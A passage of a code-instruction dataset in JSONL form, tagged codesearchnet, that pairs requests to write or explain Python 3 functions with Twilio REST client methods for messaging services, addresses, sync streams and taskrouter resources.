bool fallback_to_long_code: Configuration to enable or disable Fallback to Long Code.\n        :param bool area_code_geomatch: Configuration to enable or disable Area Code Geomatch.\n        :param unicode validity_period: Configuration to set the validity period of all messages sent from your Service, in seconds.\n        :param bool synchronous_validation: The synchronous_validation\n\n        :returns: Newly created ServiceInstance\n        :rtype: twilio.rest.messaging.v1.service.ServiceInstance\n        \"\"\"\n        data = values.of({\n            'FriendlyName': friendly_name,\n            'InboundRequestUrl': inbound_request_url,\n            'InboundMethod': inbound_method,\n            'FallbackUrl': fallback_url,\n            'FallbackMethod': fallback_method,\n            'StatusCallback': status_callback,\n            'StickySender': sticky_sender,\n            'MmsConverter': mms_converter,\n            'SmartEncoding': smart_encoding,\n            'ScanMessageContent': scan_message_content,\n            'FallbackToLongCode': fallback_to_long_code,\n            'AreaCodeGeomatch': area_code_geomatch,\n            'ValidityPeriod': validity_period,\n            'SynchronousValidation': synchronous_validation,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return ServiceInstance(self._version, payload, )", "response": "Creates a new ServiceInstance object for the given friendly name."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\naccess the alpha_senders :returns: twilio.rest.messaging.v1.service.alpha_sender.AlphaSenderList :rtype: twilio.rest.messaging.v1.service.alpha_sender.AlphaSenderList", "response": "def alpha_senders(self):\n        \"\"\"\n        Access the alpha_senders\n\n        :returns: twilio.rest.messaging.v1.service.alpha_sender.AlphaSenderList\n        :rtype: twilio.rest.messaging.v1.service.alpha_sender.AlphaSenderList\n        \"\"\"\n        if self._alpha_senders is None:\n            self._alpha_senders = AlphaSenderList(self._version, service_sid=self._solution['sid'], )\n        return self._alpha_senders"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nupdate the ServiceInstance s Information", "response": "def update(self, friendly_name=values.unset, inbound_request_url=values.unset,\n               inbound_method=values.unset, fallback_url=values.unset,\n               fallback_method=values.unset, status_callback=values.unset,\n               sticky_sender=values.unset, mms_converter=values.unset,\n               smart_encoding=values.unset, scan_message_content=values.unset,\n               fallback_to_long_code=values.unset, area_code_geomatch=values.unset,\n               validity_period=values.unset, synchronous_validation=values.unset):\n        \"\"\"\n        Update the ServiceInstance\n\n        :param unicode friendly_name: The friendly_name\n        :param unicode inbound_request_url: The inbound_request_url\n        :param unicode inbound_method: The inbound_method\n        :param unicode fallback_url: The fallback_url\n        :param unicode fallback_method: The fallback_method\n        :param unicode status_callback: The status_callback\n        :param bool sticky_sender: The sticky_sender\n        :param bool mms_converter: The mms_converter\n        :param bool smart_encoding: The smart_encoding\n        :param ServiceInstance.ScanMessageContent scan_message_content: The scan_message_content\n        :param bool fallback_to_long_code: The fallback_to_long_code\n        :param bool area_code_geomatch: The area_code_geomatch\n        :param unicode validity_period: The validity_period\n        :param bool synchronous_validation: The synchronous_validation\n\n        :returns: Updated ServiceInstance\n        :rtype: twilio.rest.messaging.v1.service.ServiceInstance\n        \"\"\"\n        return self._proxy.update(\n            friendly_name=friendly_name,\n            inbound_request_url=inbound_request_url,\n            inbound_method=inbound_method,\n            fallback_url=fallback_url,\n            fallback_method=fallback_method,\n            status_callback=status_callback,\n            sticky_sender=sticky_sender,\n            mms_converter=mms_converter,\n            smart_encoding=smart_encoding,\n            scan_message_content=scan_message_content,\n            fallback_to_long_code=fallback_to_long_code,\n            area_code_geomatch=area_code_geomatch,\n            validity_period=validity_period,\n            synchronous_validation=synchronous_validation,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_instance(self, payload):\n        return NewKeyInstance(self._version, payload, account_sid=self._solution['account_sid'], )", "response": "Build an instance of NewKeyInstance"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ncreating a new FieldInstance", "response": "def create(self, field_type, unique_name):\n        \"\"\"\n        Create a new FieldInstance\n\n        :param unicode field_type: The Field Type of this field\n        :param unicode unique_name: An application-defined string that uniquely identifies the new resource\n\n        :returns: Newly created FieldInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.task.field.FieldInstance\n        \"\"\"\n        data = values.of({'FieldType': field_type, 'UniqueName': unique_name, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return FieldInstance(\n            self._version,\n            payload,\n            assistant_sid=self._solution['assistant_sid'],\n            task_sid=self._solution['task_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get(self, sid):\n        return FieldContext(\n            self._version,\n            assistant_sid=self._solution['assistant_sid'],\n            task_sid=self._solution['task_sid'],\n            sid=sid,\n        )", "response": "Constructs a FieldContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.autopilot.v1.assistant.task.field.FieldContext\n        :rtype: twilio.rest.autopilot.v1.assistant.task.field.FieldContext"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nbuilds an instance of FieldInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of FieldInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.autopilot.v1.assistant.task.field.FieldInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.task.field.FieldInstance\n        \"\"\"\n        return FieldInstance(\n            self._version,\n            payload,\n            assistant_sid=self._solution['assistant_sid'],\n            task_sid=self._solution['task_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ngenerates an instance context for the resource the context is capable of performing various actions. The context is proxied to the instance itself if the instance is already running.", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: FieldContext for this FieldInstance\n        :rtype: twilio.rest.autopilot.v1.assistant.task.field.FieldContext\n        \"\"\"\n        if self._context is None:\n            self._context = FieldContext(\n                self._version,\n                assistant_sid=self._solution['assistant_sid'],\n                task_sid=self._solution['task_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nbuild an instance of MachineToMachineInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of MachineToMachineInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.api.v2010.account.available_phone_number.machine_to_machine.MachineToMachineInstance\n        :rtype: twilio.rest.api.v2010.account.available_phone_number.machine_to_machine.MachineToMachineInstance\n        \"\"\"\n        return MachineToMachineInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            country_code=self._solution['country_code'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nbuild an instance of YearlyInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of YearlyInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.api.v2010.account.usage.record.yearly.YearlyInstance\n        :rtype: twilio.rest.api.v2010.account.usage.record.yearly.YearlyInstance\n        \"\"\"\n        return YearlyInstance(self._version, payload, account_sid=self._solution['account_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef create(self, path, visibility):\n        data = values.of({'Path': path, 'Visibility': visibility, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return FunctionVersionInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            function_sid=self._solution['function_sid'],\n        )", "response": "Create a new FunctionVersionInstance"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nconstructing a FunctionVersionContext :param sid: The sid :returns: twilio.rest.serverless.v1.service.function.function_version.FunctionVersionContext :rtype: twilio.rest.serverless.v1.service.function.function_version.FunctionVersionContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a FunctionVersionContext\n\n        :param sid: The sid\n\n        :returns: twilio.rest.serverless.v1.service.function.function_version.FunctionVersionContext\n        :rtype: twilio.rest.serverless.v1.service.function.function_version.FunctionVersionContext\n        \"\"\"\n        return FunctionVersionContext(\n            self._version,\n            service_sid=self._solution['service_sid'],\n            function_sid=self._solution['function_sid'],\n            sid=sid,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nbuilds an instance of FunctionVersionInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of FunctionVersionInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.serverless.v1.service.function.function_version.FunctionVersionInstance\n        :rtype: twilio.rest.serverless.v1.service.function.function_version.FunctionVersionInstance\n        \"\"\"\n        return FunctionVersionInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            function_sid=self._solution['function_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nfetch a FunctionVersionInstance :returns: Fetched FunctionVersionInstance :rtype: twilio.rest.serverless.v1.service.function.function_version.FunctionVersionInstance", "response": "def fetch(self):\n        \"\"\"\n        Fetch a FunctionVersionInstance\n\n        :returns: Fetched FunctionVersionInstance\n        :rtype: twilio.rest.serverless.v1.service.function.function_version.FunctionVersionInstance\n        \"\"\"\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return FunctionVersionInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            function_sid=self._solution['function_sid'],\n            sid=self._solution['sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ngenerate an instance context for the object", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: FunctionVersionContext for this FunctionVersionInstance\n        :rtype: twilio.rest.serverless.v1.service.function.function_version.FunctionVersionContext\n        \"\"\"\n        if self._context is None:\n            self._context = FunctionVersionContext(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                function_sid=self._solution['function_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef create(self, friendly_name, available=values.unset):\n        data = values.of({'FriendlyName': friendly_name, 'Available': available, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return ActivityInstance(self._version, payload, workspace_sid=self._solution['workspace_sid'], )", "response": "Create a new ActivityInstance"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nconstruct a ActivityContext :param sid: The sid :returns: twilio.rest.taskrouter.v1.workspace.activity.ActivityContext :rtype: twilio.rest.taskrouter.v1.workspace.activity.ActivityContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a ActivityContext\n\n        :param sid: The sid\n\n        :returns: twilio.rest.taskrouter.v1.workspace.activity.ActivityContext\n        :rtype: twilio.rest.taskrouter.v1.workspace.activity.ActivityContext\n        \"\"\"\n        return ActivityContext(self._version, workspace_sid=self._solution['workspace_sid'], sid=sid, )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_instance(self, payload):\n        return ActivityInstance(self._version, payload, workspace_sid=self._solution['workspace_sid'], )", "response": "Build an instance of ActivityInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ngenerates an instance context for the object", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: ActivityContext for this ActivityInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.activity.ActivityContext\n        \"\"\"\n        if self._context is None:\n            self._context = ActivityContext(\n                self._version,\n                workspace_sid=self._solution['workspace_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get(self, sid):\n        return InstalledAddOnExtensionContext(\n            self._version,\n            installed_add_on_sid=self._solution['installed_add_on_sid'],\n            sid=sid,\n        )", "response": "Constructs a InstalledAddOnExtensionContext\n\n        :param sid: The unique Extension Sid\n\n        :returns: twilio.rest.preview.marketplace.installed_add_on.installed_add_on_extension.InstalledAddOnExtensionContext\n        :rtype: twilio.rest.preview.marketplace.installed_add_on.installed_add_on_extension.InstalledAddOnExtensionContext"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_instance(self, payload):\n        return InstalledAddOnExtensionInstance(\n            self._version,\n            payload,\n            installed_add_on_sid=self._solution['installed_add_on_sid'],\n        )", "response": "Build an instance of InstalledAddOnExtensionInstance"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nfetching a InstalledAddOnExtensionInstance :returns: Fetched InstalledAddOnExtensionInstance :rtype: twilio.rest.preview.marketplace.installed_add_on.installed_add_on_extension.InstalledAddOnExtensionInstance", "response": "def fetch(self):\n        \"\"\"\n        Fetch a InstalledAddOnExtensionInstance\n\n        :returns: Fetched InstalledAddOnExtensionInstance\n        :rtype: twilio.rest.preview.marketplace.installed_add_on.installed_add_on_extension.InstalledAddOnExtensionInstance\n        \"\"\"\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return InstalledAddOnExtensionInstance(\n            self._version,\n            payload,\n            installed_add_on_sid=self._solution['installed_add_on_sid'],\n            sid=self._solution['sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nupdating the InstalledAddOnExtensionInstance :param bool enabled: A Boolean indicating if the Extension will be invoked :returns: Updated InstalledAddOnExtensionInstance :rtype: twilio.rest.preview.marketplace.installed_add_on.installed_add_on_extension.InstalledAddOnExtensionInstance", "response": "def update(self, enabled):\n        \"\"\"\n        Update the InstalledAddOnExtensionInstance\n\n        :param bool enabled: A Boolean indicating if the Extension will be invoked\n\n        :returns: Updated InstalledAddOnExtensionInstance\n        :rtype: twilio.rest.preview.marketplace.installed_add_on.installed_add_on_extension.InstalledAddOnExtensionInstance\n        \"\"\"\n        data = values.of({'Enabled': enabled, })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return InstalledAddOnExtensionInstance(\n            self._version,\n            payload,\n            installed_add_on_sid=self._solution['installed_add_on_sid'],\n            sid=self._solution['sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngenerating an instance context for the instance of InstalledAddOnExtensionInstance", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: InstalledAddOnExtensionContext for this InstalledAddOnExtensionInstance\n        :rtype: twilio.rest.preview.marketplace.installed_add_on.installed_add_on_extension.InstalledAddOnExtensionContext\n        \"\"\"\n        if self._context is None:\n            self._context = InstalledAddOnExtensionContext(\n                self._version,\n                installed_add_on_sid=self._solution['installed_add_on_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ncreates a new AddressInstance", "response": "def create(self, customer_name, street, city, region, postal_code, iso_country,\n               friendly_name=values.unset, emergency_enabled=values.unset,\n               auto_correct_address=values.unset):\n        \"\"\"\n        Create a new AddressInstance\n\n        :param unicode customer_name: The name to associate with the new address\n        :param unicode street: The number and street address of the new address\n        :param unicode city: The city of the new address\n        :param unicode region: The state or region of the new address\n        :param unicode postal_code: The postal code of the new address\n        :param unicode iso_country: The ISO country code of the new address\n        :param unicode friendly_name: A string to describe the new resource\n        :param bool emergency_enabled: Whether to enable emergency calling on the new address\n        :param bool auto_correct_address: Whether we should automatically correct the address\n\n        :returns: Newly created AddressInstance\n        :rtype: twilio.rest.api.v2010.account.address.AddressInstance\n        \"\"\"\n        data = values.of({\n            'CustomerName': customer_name,\n            'Street': street,\n            'City': city,\n            'Region': region,\n            'PostalCode': postal_code,\n            'IsoCountry': iso_country,\n            'FriendlyName': friendly_name,\n            'EmergencyEnabled': emergency_enabled,\n            'AutoCorrectAddress': auto_correct_address,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return AddressInstance(self._version, payload, account_sid=self._solution['account_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef list(self, customer_name=values.unset, friendly_name=values.unset,\n             iso_country=values.unset, limit=None, page_size=None):\n        \"\"\"\n        Lists AddressInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param unicode customer_name: The `customer_name` of the Address resources to read\n        :param unicode friendly_name: The string that identifies the Address resources to read\n        :param unicode iso_country: The ISO country code of the Address resources to read\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.api.v2010.account.address.AddressInstance]\n        \"\"\"\n        return list(self.stream(\n            customer_name=customer_name,\n            friendly_name=friendly_name,\n            iso_country=iso_country,\n            limit=limit,\n            page_size=page_size,\n        ))", "response": "Streams the AddressInstance records from the API as a list."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nretrieve a single page of AddressInstance records from the API. Request is executed immediately", "response": "def page(self, customer_name=values.unset, friendly_name=values.unset,\n             iso_country=values.unset, page_token=values.unset,\n             page_number=values.unset, page_size=values.unset):\n        \"\"\"\n        Retrieve a single page of AddressInstance records from the API.\n        Request is executed immediately\n\n        :param unicode customer_name: The `customer_name` of the Address resources to read\n        :param unicode friendly_name: The string that identifies the Address resources to read\n        :param unicode iso_country: The ISO country code of the Address resources to read\n        :param str page_token: PageToken provided by the API\n        :param int page_number: Page Number, this value is simply for client state\n        :param int page_size: Number of records to return, defaults to 50\n\n        :returns: Page of AddressInstance\n        :rtype: twilio.rest.api.v2010.account.address.AddressPage\n        \"\"\"\n        params = values.of({\n            'CustomerName': customer_name,\n            'FriendlyName': friendly_name,\n            'IsoCountry': iso_country,\n            'PageToken': page_token,\n            'Page': page_number,\n            'PageSize': page_size,\n        })\n\n        response = self._version.page(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return AddressPage(self._version, response, self._solution)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nconstruct a AddressContext :param sid: The unique string that identifies the resource :returns: twilio.rest.api.v2010.account.address.AddressContext :rtype: twilio.rest.api.v2010.account.address.AddressContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a AddressContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.api.v2010.account.address.AddressContext\n        :rtype: twilio.rest.api.v2010.account.address.AddressContext\n        \"\"\"\n        return AddressContext(self._version, account_sid=self._solution['account_sid'], sid=sid, )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nbuilding an instance of AddressInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of AddressInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.api.v2010.account.address.AddressInstance\n        :rtype: twilio.rest.api.v2010.account.address.AddressInstance\n        \"\"\"\n        return AddressInstance(self._version, payload, account_sid=self._solution['account_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nupdate the AddressInstance :param unicode friendly_name: A string to describe the resource :param unicode customer_name: The name to associate with the address :param unicode street: The number and street address of the address :param unicode city: The city of the address :param unicode region: The state or region of the address :param unicode postal_code: The postal code of the address :param bool emergency_enabled: Whether to enable emergency calling on the address :param bool auto_correct_address: Whether we should automatically correct the address :returns: Updated AddressInstance :rtype: twilio.rest.api.v2010.account.address.AddressInstance", "response": "def update(self, friendly_name=values.unset, customer_name=values.unset,\n               street=values.unset, city=values.unset, region=values.unset,\n               postal_code=values.unset, emergency_enabled=values.unset,\n               auto_correct_address=values.unset):\n        \"\"\"\n        Update the AddressInstance\n\n        :param unicode friendly_name: A string to describe the resource\n        :param unicode customer_name: The name to associate with the address\n        :param unicode street: The number and street address of the address\n        :param unicode city: The city of the address\n        :param unicode region: The state or region of the address\n        :param unicode postal_code: The postal code of the address\n        :param bool emergency_enabled: Whether to enable emergency calling on the address\n        :param bool auto_correct_address: Whether we should automatically correct the address\n\n        :returns: Updated AddressInstance\n        :rtype: twilio.rest.api.v2010.account.address.AddressInstance\n        \"\"\"\n        data = values.of({\n            'FriendlyName': friendly_name,\n            'CustomerName': customer_name,\n            'Street': street,\n            'City': city,\n            'Region': region,\n            'PostalCode': postal_code,\n            'EmergencyEnabled': emergency_enabled,\n            'AutoCorrectAddress': auto_correct_address,\n        })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return AddressInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            sid=self._solution['sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef dependent_phone_numbers(self):\n        if self._dependent_phone_numbers is None:\n            self._dependent_phone_numbers = DependentPhoneNumberList(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                address_sid=self._solution['sid'],\n            )\n        return self._dependent_phone_numbers", "response": "Access the dependent_phone_numbers\n\n        :returns: twilio.rest.api.v2010.account.address.dependent_phone_number.DependentPhoneNumberList\n        :rtype: twilio.rest.api.v2010.account.address.dependent_phone_number.DependentPhoneNumberList"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ngenerating an instance context for the resource", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: AddressContext for this AddressInstance\n        :rtype: twilio.rest.api.v2010.account.address.AddressContext\n        \"\"\"\n        if self._context is None:\n            self._context = AddressContext(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef update(self, friendly_name=values.unset, customer_name=values.unset,\n               street=values.unset, city=values.unset, region=values.unset,\n               postal_code=values.unset, emergency_enabled=values.unset,\n               auto_correct_address=values.unset):\n        \"\"\"\n        Update the AddressInstance\n\n        :param unicode friendly_name: A string to describe the resource\n        :param unicode customer_name: The name to associate with the address\n        :param unicode street: The number and street address of the address\n        :param unicode city: The city of the address\n        :param unicode region: The state or region of the address\n        :param unicode postal_code: The postal code of the address\n        :param bool emergency_enabled: Whether to enable emergency calling on the address\n        :param bool auto_correct_address: Whether we should automatically correct the address\n\n        :returns: Updated AddressInstance\n        :rtype: twilio.rest.api.v2010.account.address.AddressInstance\n        \"\"\"\n        return self._proxy.update(\n            friendly_name=friendly_name,\n            customer_name=customer_name,\n            street=street,\n            city=city,\n            region=region,\n            postal_code=postal_code,\n            emergency_enabled=emergency_enabled,\n            auto_correct_address=auto_correct_address,\n        )", "response": "Update the AddressInstance s properties"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nconstruct a WorkflowStatisticsContext :returns: twilio.rest.taskrouter.v1.workspace.workflow.workflow_statistics.WorkflowStatisticsContext :rtype: twilio.rest.taskrouter.v1.workspace.workflow.workflow_statistics.WorkflowStatisticsContext", "response": "def get(self):\n        \"\"\"\n        Constructs a WorkflowStatisticsContext\n\n        :returns: twilio.rest.taskrouter.v1.workspace.workflow.workflow_statistics.WorkflowStatisticsContext\n        :rtype: twilio.rest.taskrouter.v1.workspace.workflow.workflow_statistics.WorkflowStatisticsContext\n        \"\"\"\n        return WorkflowStatisticsContext(\n            self._version,\n            workspace_sid=self._solution['workspace_sid'],\n            workflow_sid=self._solution['workflow_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_instance(self, payload):\n        return WorkflowStatisticsInstance(\n            self._version,\n            payload,\n            workspace_sid=self._solution['workspace_sid'],\n            workflow_sid=self._solution['workflow_sid'],\n        )", "response": "Build an instance of WorkflowStatisticsInstance"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _proxy(self):\n        if self._context is None:\n            self._context = WorkflowStatisticsContext(\n                self._version,\n                workspace_sid=self._solution['workspace_sid'],\n                workflow_sid=self._solution['workflow_sid'],\n            )\n        return self._context", "response": "Generate an instance context for the object"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get(self, identity):\n        return DocumentPermissionContext(\n            self._version,\n            service_sid=self._solution['service_sid'],\n            document_sid=self._solution['document_sid'],\n            identity=identity,\n        )", "response": "Constructs a DocumentPermissionContext\n\n        :param identity: Identity of the user to whom the Sync Document Permission applies.\n\n        :returns: twilio.rest.sync.v1.service.document.document_permission.DocumentPermissionContext\n        :rtype: twilio.rest.sync.v1.service.document.document_permission.DocumentPermissionContext"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_instance(self, payload):\n        return DocumentPermissionInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            document_sid=self._solution['document_sid'],\n        )", "response": "Build an instance of DocumentPermissionInstance"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef fetch(self):\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return DocumentPermissionInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            document_sid=self._solution['document_sid'],\n            identity=self._solution['identity'],\n        )", "response": "Fetch a DocumentPermissionInstance\n\n        :returns: Fetched DocumentPermissionInstance\n        :rtype: twilio.rest.sync.v1.service.document.document_permission.DocumentPermissionInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef update(self, read, write, manage):\n        data = values.of({'Read': read, 'Write': write, 'Manage': manage, })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return DocumentPermissionInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            document_sid=self._solution['document_sid'],\n            identity=self._solution['identity'],\n        )", "response": "Update the DocumentPermissionInstance\n\n        :param bool read: Read access.\n        :param bool write: Write access.\n        :param bool manage: Manage access.\n\n        :returns: Updated DocumentPermissionInstance\n        :rtype: twilio.rest.sync.v1.service.document.document_permission.DocumentPermissionInstance"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _proxy(self):\n        if self._context is None:\n            self._context = DocumentPermissionContext(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                document_sid=self._solution['document_sid'],\n                identity=self._solution['identity'],\n            )\n        return self._context", "response": "Generate an instance context for the documentPermissionInstance\n       "}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nconstructing a SyncStreamContext :param sid: Stream SID or unique name. :returns: twilio.rest.sync.v1.service.sync_stream.SyncStreamContext :rtype: twilio.rest.sync.v1.service.sync_stream.SyncStreamContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a SyncStreamContext\n\n        :param sid: Stream SID or unique name.\n\n        :returns: twilio.rest.sync.v1.service.sync_stream.SyncStreamContext\n        :rtype: twilio.rest.sync.v1.service.sync_stream.SyncStreamContext\n        \"\"\"\n        return SyncStreamContext(self._version, service_sid=self._solution['service_sid'], sid=sid, )"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nbuild an instance of SyncStreamInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of SyncStreamInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.sync.v1.service.sync_stream.SyncStreamInstance\n        :rtype: twilio.rest.sync.v1.service.sync_stream.SyncStreamInstance\n        \"\"\"\n        return SyncStreamInstance(self._version, payload, service_sid=self._solution['service_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\naccess the stream_messages :returns: twilio.rest.sync.v1.service.sync_stream.stream_message.StreamMessageList :rtype: twilio.rest.sync.v1.service.sync_stream.stream_message.StreamMessageList", "response": "def stream_messages(self):\n        \"\"\"\n        Access the stream_messages\n\n        :returns: twilio.rest.sync.v1.service.sync_stream.stream_message.StreamMessageList\n        :rtype: twilio.rest.sync.v1.service.sync_stream.stream_message.StreamMessageList\n        \"\"\"\n        if self._stream_messages is None:\n            self._stream_messages = StreamMessageList(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                stream_sid=self._solution['sid'],\n            )\n        return self._stream_messages"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ngenerates an instance context for the object", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: SyncStreamContext for this SyncStreamInstance\n        :rtype: twilio.rest.sync.v1.service.sync_stream.SyncStreamContext\n        \"\"\"\n        if self._context is None:\n            self._context = SyncStreamContext(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nupdates the SyncStreamInstance with the given TTL", "response": "def update(self, ttl=values.unset):\n        \"\"\"\n        Update the SyncStreamInstance\n\n        :param unicode ttl: Stream TTL.\n\n        :returns: Updated SyncStreamInstance\n        :rtype: twilio.rest.sync.v1.service.sync_stream.SyncStreamInstance\n        \"\"\"\n        return self._proxy.update(ttl=ttl, )"}
